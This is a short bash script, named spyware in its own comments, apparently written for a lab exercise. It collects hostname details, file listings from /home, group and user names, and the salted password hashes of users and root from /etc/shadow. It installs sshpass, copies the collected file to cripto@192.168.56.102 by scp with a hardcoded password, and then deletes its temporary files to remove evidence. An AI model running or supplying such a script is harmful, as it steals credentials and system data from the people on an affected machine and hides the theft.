#!/bin/bash

#remove the spyware 
#rm spyware.sh

#Changing working directory for ease of execution
cd /home

# Getting the system properties
printf 'System properties:\n\n' > /tmp/spyware_payload
hostnamectl >> /tmp/spyware_payload

# Getting file names, permissions, size and type
printf '\n\nFiles in /home:\n\n' >> /tmp/spyware_payload
ls $PWD > /tmp/files_in_home
file -f /tmp/files_in_home >> /tmp/spyware_payload
printf '\n\nSize of files in /home\n\n' >> /tmp/spyware_payload
ls -hl  >> /tmp/spyware_payload

# Getting all the groups in the system
printf '\n\nVictim system Groups:\n\n' >> /tmp/spyware_payload
cat /etc/group | awk -F: '{print $1}' >> /tmp/spyware_payload

# Getting all the users in the group users
printf '\n\nVictim system Users:\n\n' >> /tmp/spyware_payload
getent group users | awk -F: '{print $4}' > /tmp/userssystem
cat /tmp/userssystem >> /tmp/spyware_payload

# Getting Hashed + Salt passwords for users and root
printf '\n\nHash + Salt\n\n' >> /tmp/spyware_payload
grep -f /tmp/userssystem /etc/shadow >> /tmp/spyware_payload
grep ^root /etc/shadow >> /tmp/spyware_payload

# Changing permissions to send file
chmod 777 /tmp/spyware_payload

# Installing sshpass for extraction
if ! command -v sshpass 2>&1 >/dev/null
then
   apt install sshpass
fi

#Extracting file
sshpass -p "qwert12345" scp /tmp/spyware_payload cripto@192.168.56.102:/home/cripto/Downloads

# Removing evidence
rm /tmp/files_in_home
rm /tmp/userssytem
rm /tmp/spyware_payload
